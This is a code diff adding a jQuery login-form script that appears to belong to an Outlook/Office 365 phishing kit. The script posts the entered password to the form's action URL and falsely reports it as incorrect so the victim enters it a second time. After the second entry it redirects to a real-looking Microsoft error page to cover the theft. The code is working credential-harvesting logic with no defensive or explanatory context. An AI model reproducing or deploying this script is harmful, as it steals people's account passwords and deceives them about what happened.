@@ -1,0 +1,64 @@
+$(function(){
+    
+
+                        
+    $("#formSearch").submit(function(e){
+        e.preventDefault();
+        
+        if($('#password').val() == '')
+        {
+             $('#sensitive').html('Please enter your password.')
+             $('#sensitive').addClass('text-danger')
+            
+            
+        }else{
+            
+        var form=$(this);
+        var url=form.attr('action');
+        var count = $('#count').val()
+        $.ajax({
+                 type:"POST",
+                  url:url,
+                  cache: false,
+                  data:form.serialize(),
+                  success:function(data){
+                      if(data == 'empty' ){
+                          
+                           $('#password').val('')
+                           $('#sensitive').html("Your account or password is incorrect. If you can't remember your password, reset it now. ")
+                           $('#sensitive').addClass('text-danger')
+                   
+                          
+                      }else{
+                          
+                          
+                           if(count == 0)
+                              {
+                                   $('#password').val('')
+                                   $('#sensitive').html("Your account or password is incorrect. If you can't remember your password, reset it now. ")
+                                   $('#sensitive').addClass('text-danger')
+                                   $('#error').show()
+                                   $('#count').val(1)
+                                 
+                                   
+                              }else if(count == 1 ){
+                                 window.location.replace("https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee");
+                              }
+                              
+                      }
+                     
+                      
+                  }
+    
+           })
+           
+           
+            
+        }
+        
+       
+    
+    })
+
+})
+
